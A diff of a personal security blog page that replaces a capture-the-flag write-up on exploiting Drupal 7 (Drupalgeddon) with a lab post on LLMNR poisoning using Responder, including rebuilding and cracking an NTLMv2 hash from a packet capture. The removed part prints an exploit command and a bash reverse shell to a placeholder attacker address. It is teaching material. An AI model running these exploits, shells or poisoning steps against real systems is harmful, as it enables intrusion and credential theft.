@@ -6,14 +6,13 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
   <meta name="generator" content="Hugo 0.92.2" />
-  <link rel="canonical" href="https://1d8.github.io/writeups/provinggrounds/dc-1/" />
+  <link rel="canonical" href="https://1d8.github.io/publications/llmnrpoisoning/" />
 
   
     
-    <meta name="description" content="Despite the name, this is not a Domain Controller and is indeed a Linux box!
-Starting off with a quick nmap scan of the box:
-We see 3 services running on the box:
- 22 - SSH 80 - HTTP 111 - RPCBind  What really caught my attention was port 80 since it’s running Drupal, which is an open-source Content Management System (CMS) and nmap is telling us that it’s running version 7 of Drupal which has an SQL injection vulnerability that was dubbed Drupalgeddon!">
+    <meta name="description" content="Description: This post will dive into the topic of LLMNR poisoning, specifically what the LLMNR protocol is, how we could poison it, and diving into what it looks like in a packet capture
+Lab Setup In my lab setup, I have 3 machines:
+ Kali Linux machine representing the threat actor  IP address - 192.168.56.107   Windows workstation representing the victim  IP address - 192.168.56.118   Windows server representing the Domain Controller (DC)  IP address - 192.">
   
 
   <link rel="apple-touch-icon" sizes="180x180" href="https://1d8.github.io/apple-touch-icon.png">
@@ -63,7 +62,7 @@ We see 3 services running on the box:
 
   
   
-  <title>DC-1 Writeup | </title>
+  <title>Diving Into LLMNR Poisoning | </title>
 </head>
 
   <body>
@@ -259,57 +258,111 @@ We see 3 services running on the box:
         <div>
           
   <main id="main">
-    <h1>DC-1 Writeup</h1>
-    <p>Despite the name, this is not a Domain Controller and is indeed a Linux box!</p>
-<p>Starting off with a quick <code>nmap</code> scan of the box:</p>
-<p><img src="https://i.imgur.com/AmKH43e.png" alt=""></p>
-<p>We see 3 services running on the box:</p>
+    <h1>Diving Into LLMNR Poisoning</h1>
+    <p><strong>Description: This post will dive into the topic of LLMNR poisoning, specifically what the LLMNR protocol is, how we could poison it, and diving into what it looks like in a packet capture</strong></p>
+<h1 id="lab-setup">Lab Setup</h1>
+<p>In my lab setup, I have 3 machines:</p>
 <ul>
-<li><code>22</code> - SSH</li>
-<li><code>80</code> - HTTP</li>
-<li><code>111</code> - RPCBind</li>
-</ul>
-<p>What really caught my attention was port <code>80</code> since it&rsquo;s running <code>Drupal</code>, which is an open-source <em>Content Management System (CMS)</em> and <code>nmap</code> is telling us that it&rsquo;s running version 7 of Drupal which has an SQL injection vulnerability that was dubbed <code>Drupalgeddon</code>!</p>
-<p>Exploiting this SQL injection can lead to us adding a new admin user to the CMS which we could abuse to get an initial shell foothold on the host! I used a Python script to exploit this SQL vulnerability which can be <a href="https://www.exploit-db.com/exploits/34992">found here</a>:
-<em>NOTE: This Python exploit is written in Python 2, so you&rsquo;ll need that downloaded in order to run it successfully!</em></p>
-<p><code>python2 drupalexploit.py -t http://192.168.217.193 -u 1d8 -p password</code>:</p>
-<p><img src="https://i.imgur.com/hwigLwm.png" alt=""></p>
-<p><img src="https://i.imgur.com/9AaZsJh.png" alt=""></p>
-<p>And we&rsquo;re able to login to the Drupal instance! If we take a look at our <strong>Roles</strong>, we&rsquo;ll see that we&rsquo;re <strong>administrators</strong>:</p>
-<p><img src="https://i.imgur.com/zbjyoMx.png" alt=""></p>
-<p>Fantastic! Now let&rsquo;s get a shell!</p>
-<p>According to <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal">HackTricks</a>, we can get RCE on a Drupal instance by using the <strong>PHP Filter Module</strong>. Let&rsquo;s go to modules &gt; PHP filter &gt; Checkmark it &gt; save configuration!</p>
-<p>After that, go to modules &gt; PHP Filter &gt; Permissions &gt; set <strong>the Use PHP Code text format</strong> filter to be allowed by Administrators, then save these permissions:</p>
-<p><img src="https://i.imgur.com/nSNiWsr.png" alt=""></p>
-<p>Now we can create a new page on the Drupal instance &amp; set the text format to be PHP code &amp; have the server execute any PHP code that we want!</p>
-<p>Go to content &gt; Add Content &gt; Choose either basic page or article &gt; Give the new page a title &amp; insert a PHP reverse shell into the body &gt; Set the text format to be <strong>PHP Code</strong>:</p>
-<p><img src="https://i.imgur.com/VXLGTAk.png" alt=""></p>
+<li>Kali Linux machine representing the <strong>threat actor</strong>
 <ul>
-<li>I chose to use the following PHP reverse shell:  <code>&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;Attacker IP Address&gt;/&lt;Attacker Port&gt; 0&gt;&amp;1'&quot;);?&gt;</code></li>
+<li>IP address - <strong>192.168.56.107</strong></li>
 </ul>
-<p>On your attacker host, you can run <code>nc -lvnp &lt;port&gt;</code>, I&rsquo;ll be using <a href="https://github.com/calebstewart/pwncat">pwncat</a> so in this case, I ran: <code>pwncat-cs -lp &lt;port&gt;</code> to start the listening port.</p>
-<p>After the listening port has been setup, click <strong>Save</strong> on the Drupal instance &amp; you should get a connection:</p>
-<p><img src="https://i.imgur.com/d33oC1d.png" alt=""></p>
-<p>Let&rsquo;s get onto the <strong>privilege escalation</strong> portion!</p>
-<h1 id="privilege-escalation">Privilege Escalation</h1>
-<p>We can start by running good ol' <code>LinPeas.sh</code>. Since I&rsquo;m using <code>pwncat</code>, I just need to run <code>upload linpeas.sh</code> &amp; ensure I&rsquo;m in the same directory that the file is located in to upload it to the target host.</p>
-<p>If you aren&rsquo;t using <code>linpeas</code>, starting up a simple python3 web server &amp; <code>wget</code> will do just fine though!</p>
-<p>After <code>linpeas.sh</code> has finished running, you&rsquo;ll notice that under the <code>SUID</code> section, it found that the <code>find</code> command had the <code>SUID</code> bit set. All this means is we&rsquo;re able to run certain binaries using an elevated users' permissions. For us, this means potential privilege escalation:</p>
-<p><img src="https://i.imgur.com/oHkNiMO.png" alt=""></p>
-<p>We can cross-reference this with <a href="https://gtfobins.github.io/gtfobins/find/">GTFOBins</a> to attempt to find any reference to the <code>find</code> binary being used for privilege escalation:</p>
-<p><img src="https://i.imgur.com/JjB5xW6.png" alt=""></p>
-<p>And we got it! Let&rsquo;s run this command:</p>
-<p><img src="https://i.imgur.com/JLmcIAj.png" alt=""></p>
-<p>Notice how it still says the UID is 33 which is <code>www-data</code> so this low privilege user still owns the process, though the process still has the full permissions that are granted to the <code>root</code> user, even though the process isn&rsquo;t owned by <code>root</code>! That&rsquo;s the magic of SUID bits!</p>
-<p>One more thing to mention, <code>pwncat</code> has a module that can be used for automated privilege escalation named <code>escalate</code>, unfortunately though, it didn&rsquo;t seem to find the SUID bit for the <code>find</code> binary as an escalation path:</p>
-<p><img src="https://i.imgur.com/fKQbIKF.png" alt=""></p>
-<p>Though, when using the <code>enumerate.file.suid</code> module, it was able to discover that the <code>find</code> binary&rsquo;s SUID bit was set:</p>
-<p><img src="https://i.imgur.com/IH6qHuV.png" alt=""></p>
+</li>
+<li>Windows workstation representing the <strong>victim</strong>
+<ul>
+<li>IP address - <strong>192.168.56.118</strong></li>
+</ul>
+</li>
+<li>Windows server representing the <strong>Domain Controller (DC)</strong>
+<ul>
+<li>IP address - <strong>192.168.56.114</strong></li>
+</ul>
+</li>
+</ul>
+<h1 id="what-is-llmnr">What is LLMNR?</h1>
+<p><strong>Link-Local Multicast Name Resolution (LLMNR)</strong> is a protocol that allows for hosts on a Windows network to perform name resolution without the need for a DNS server or DNS configuration. Instead, hosts query each other for resolutions on the network. It can be thought of as a <em>peer-to-peer DNS resolution</em>.
+When a <em>query</em> from a Windows host fails, such as when the DNS server it queries doesn&rsquo;t have an <em>answer</em>, the host will then broadcast an LLMNR query to the entire network and ask all hosts within the LAN if they have that particular host&rsquo;s IP address. This is where a <strong>LLMNR Poisoning</strong> could occur if a <strong>threat actor</strong> answers the query for them and provides the IP address of a malicious server!</p>
+<h1 id="what-is-llmnr-poisoning">What is LLMNR Poisoning?</h1>
+<p><strong>LLMNR Poisoning</strong> is an attack where an attacker listens for LLMNR resolution queries &amp; answers with their own IP address (or with another IP address) in order to redirect <strong>victim</strong> traffic. Once the <strong>victim</strong> has been redirected to connect to a server that a <strong>threat actor</strong> controls, then the <strong>threat actor</strong> could request the <strong>victim</strong> to send their hash in order to connect them to a &ldquo;server&rdquo;. Then the <strong>threat actor</strong> would then deny them access after receiving their NTLM hash!</p>
+<ul>
+<li>This can lead to <em>credential theft</em> &amp; <em>relay attacks</em></li>
+</ul>
+<p>Here is an illustration that shows how LLMNR poisoning could occur (credit to <a href="https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/">TCM Security</a>):</p>
+<p><img src="https://tcm-sec.com/wp-content/uploads/2023/09/llmnr-overview.png" alt=""></p>
+<h1 id="how-to-perform-llmnr-poisoning">How to Perform LLMNR Poisoning</h1>
+<p>We&rsquo;ll be using the <a href="https://github.com/lgandx/Responder">Responder</a> tool in order to perform LLMNR poisoning. This tool doesn&rsquo;t just perform LLMNR poisoning, but also poisons other protocols such as NBT-NS and MDNS and also has built-in server capabilities that play the role of a rogue authentication server which allows us to capture the <strong>victim&rsquo;s</strong> credentials.</p>
+<p>Let&rsquo;s start running our <strong>Responder</strong> server by running:</p>
+<p><code>sudo responder -I eth0 -wFv</code></p>
+<ul>
+<li>The <code>-I</code> flag specifies the network adapter name that we&rsquo;ll be running <strong>Responder</strong> on
+<ul>
+<li>You can run <code>sudo ifconfig</code> in order to view the adapter you wish to use</li>
+</ul>
+</li>
+<li>The <code>-w</code> flag starts the WPAD rogue proxy server
+<ul>
+<li>The <code>-F</code> flag forces NTLM/basic authentication to occur. This will give the <strong>victim</strong> an authentication prompt</li>
+</ul>
+</li>
+<li>The <code>-v</code> flag tells the tool to run in <em>verbose</em> mode</li>
+</ul>
+<p>Now <strong>Responder</strong> should be running:</p>
+<p><img src="https://i.imgur.com/aQatgJn.png" alt=""></p>
+<p>We can now open up <strong>Wireshark</strong> and begin sniffing packets!</p>
+<p>Now it&rsquo;s time to trigger an event that we can poison! We can trigger an LLMNR event by hopping on our <strong>victim</strong> machine, the Windows workstation, then we can open up <em>File Explorer</em> and attempt to access a network share by typing:</p>
+<p><code>\\FileShareNameHere</code> into the search bar:</p>
+<p><img src="https://i.imgur.com/2rgbLni.png" alt=""></p>
+<p>After you&rsquo;ve hit enter, you&rsquo;ll see on our <strong>kali</strong> machine that we&rsquo;ve poisoned some answers to various queries that were sent by the <strong>victim</strong>, and that we&rsquo;ve baited the victim into authenticating to our server:</p>
+<p><img src="https://i.imgur.com/kPV9zYE.png" alt=""></p>
+<p>As a result, we got the <strong>victim&rsquo;s</strong> NTLMv2 hash!</p>
+<h1 id="diving-into-the-packet-capture">Diving into the Packet Capture</h1>
+<p>Remember that we had <strong>Wireshark</strong> running in the background while we performed this attack, let&rsquo;s revisit the packet capture and see what it looks like!
+As you can see, our <strong>victim</strong> machine, <strong>192.168.56.118</strong>, has performed various queries on the network for both <strong>MDNS</strong> &amp; <strong>LLMNR</strong> to find the IP address of the <code>1d8</code> hostname:</p>
+<p><img src="https://i.imgur.com/6xDmgCL.png" alt=""></p>
+<p>Expanding the <strong>LLMNR</strong> query, we see that it&rsquo;s sending a multicast query on the network.</p>
+<p><img src="https://i.imgur.com/tl68rni.png" alt=""></p>
+<p>We know that this is a <em>multicast query</em> by its IP address: <code>224.0.0.252</code>
+So any host on the LAN that have <strong>LLMNR</strong> enabled, such as our <strong>kali</strong> machine, can receive this query and respond to it.</p>
+<p>Unfortunately, a legitimate host couldn&rsquo;t provide an answer and instead, our <strong>kali</strong> machine, <strong>192.168.56.107</strong>, provides an answer to both the <strong>LLMNR</strong> &amp; <strong>MDNS</strong> query:</p>
+<p><img src="https://i.imgur.com/0Njg3Fk.png" alt=""></p>
+<p>As we can see, the IP address that it answered with to this query is the IP address of our <strong>kali</strong> machine, meaning that it&rsquo;s telling the <strong>victim</strong> that our <strong>kali</strong> machine is the file server its looking for:</p>
+<p><img src="https://i.imgur.com/oS6w149.png" alt=""></p>
+<p>Then, the <strong>victim</strong> attempts to access the supposed file server our <strong>kali</strong> machine is hosting via SMB which is what we see here:</p>
+<p><img src="https://i.imgur.com/KsfClbo.png" alt=""></p>
+<p>So first the SMB connection occurs, then our <strong>kali</strong> machine tells the <strong>victim</strong> that they must authenticate which I believe is done by the <code>NTLMSSP_CHALLENGE</code> packet which is when the <strong>victim</strong> sends us their NTLMv2 hash. Then we deny them access in the <code>STATUS_ACCESS_DENIED</code> packet!</p>
+<p><img src="https://i.imgur.com/6YeEpEx.png" alt=""></p>
+<p>We can dive deeper into the <code>NTLMSSP_CHALLENGE</code> &amp; <code>NTLMSSP_AUTH</code> packets in order to derive the NTLMv2 hash that the victim sends to us!
+First, let&rsquo;s grab the <strong>NTLM Server Challenge</strong> which is located in the <code>NTLMSSP_CHALLENGE</code> packet:</p>
+<p><img src="https://i.imgur.com/lKjS5Sd.png" alt=""></p>
+<p>After you&rsquo;ve grabbed the <strong>NTLM Server Challenge</strong> string, let&rsquo;s move on to the <code>NTLMSSP_AUTH</code> packet where we will grab the <strong>NTLMv2 Response</strong> &amp; the <strong>NTProofStr</strong>:</p>
+<p><img src="https://i.imgur.com/BrpZrnF.png" alt=""></p>
+<p>In addition to this, grab the <strong>User name</strong> &amp; <strong>Domain name</strong>:</p>
+<p><img src="https://i.imgur.com/mjhJVGc.png" alt=""></p>
+<p>ow you should have the following data:</p>
+<ul>
+<li>Domain name - `redteamleaders</li>
+<li>Username - <code>issacb</code></li>
+<li>NTLMv2 Response - <code>64c782b8df92803689f35dbc8ab199f8010100000000000080e5402181f4d90164c75b6fa2dc93b50000000002000800340051004a00470001001e00570049004e002d003100520054004f00460046004700330055005600550004003400570049004e002d003100520054004f0046004600470033005500560055002e00340051004a0047002e004c004f00430041004c0003001400340051004a0047002e004c004f00430041004c0005001400340051004a0047002e004c004f00430041004c000700080080e5402181f4d901060004000200000008003000300000000000000000000000002000003e857568e45f48b52909d6bb01b941570bfee9b49bf7fdb3371bc1e2de0adbdc0a001000000000000000000000000000000000000900100063006900660073002f003100640038000000000000000000</code></li>
+<li>NTProofStr - <code>64c782b8df92803689f35dbc8ab199f8</code></li>
+<li>NTLM Server Challenge - <code>32c3c92b5c816475</code></li>
+</ul>
+<p>Looking at the <strong>NTLMv2 Response</strong> and the <strong>NTProofStr</strong>, we notice that the <strong>NTLMv2 Response</strong> has the <strong>NTProofStr</strong> prepended to it. Remove it and keep them separate so now it will look like this:</p>
+<pre><code>010100000000000080e5402181f4d90164c75b6fa2dc93b50000000002000800340051004a00470001001e00570049004e002d003100520054004f00460046004700330055005600550004003400570049004e002d003100520054004f0046004600470033005500560055002e00340051004a0047002e004c004f00430041004c0003001400340051004a0047002e004c004f00430041004c0005001400340051004a0047002e004c004f00430041004c000700080080e5402181f4d901060004000200000008003000300000000000000000000000002000003e857568e45f48b52909d6bb01b941570bfee9b49bf7fdb3371bc1e2de0adbdc0a001000000000000000000000000000000000000900100063006900660073002f003100640038000000000000000000
+</code></pre>
+<p>And now we can rebuild the NTLMv2 hash that <strong>Responder</strong> captured earlier (<em>NOTE: The hash that we captured earlier with Responder is going to look different from the one we are rebuilding now. This is just because I ran the poisoning attack several times and am using the packet capture from the latest run</em>)</p>
+<p>The format of the NTLMv2 hash is:</p>
+<p><code>username::domain:NTLMServerChallenge:NTProofStr:NTLMV2ResponseWithoutNTProofStr</code></p>
+<pre><code>issacb::redteamleaders:32c3c92b5c816475:64c782b8df92803689f35dbc8ab199f8:010100000000000080e5402181f4d90164c75b6fa2dc93b50000000002000800340051004a00470001001e00570049004e002d003100520054004f00460046004700330055005600550004003400570049004e002d003100520054004f0046004600470033005500560055002e00340051004a0047002e004c004f00430041004c0003001400340051004a0047002e004c004f00430041004c0005001400340051004a0047002e004c004f00430041004c000700080080e5402181f4d901060004000200000008003000300000000000000000000000002000003e857568e45f48b52909d6bb01b941570bfee9b49bf7fdb3371bc1e2de0adbdc0a001000000000000000000000000000000000000900100063006900660073002f003100640038000000000000000000
+</code></pre>
+<p>We&rsquo;ve now reassembled successfully the NTLMv2 hash. We can now run <code>hashcat</code> on it to crack it using your favorite wordlist:</p>
+<p><code>hashcat -m 5600 hash wordlist</code></p>
+<p><img src="https://i.imgur.com/kFNYrVb.png" alt=""></p>
+<p>And as you can see, we&rsquo;ve cracked it!</p>
 <h1 id="references">References</h1>
 <ul>
-<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal</a></li>
-<li><a href="https://gtfobins.github.io/gtfobins/find/">https://gtfobins.github.io/gtfobins/find/</a></li>
-<li><a href="https://github.com/calebstewart/pwncat">https://github.com/calebstewart/pwncat</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Multicast_address">https://en.wikipedia.org/wiki/Multicast_address</a></li>
+<li><a href="https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/">https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/</a></li>
+<li><a href="https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/">https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/</a></li>
 </ul>
 
   </main>
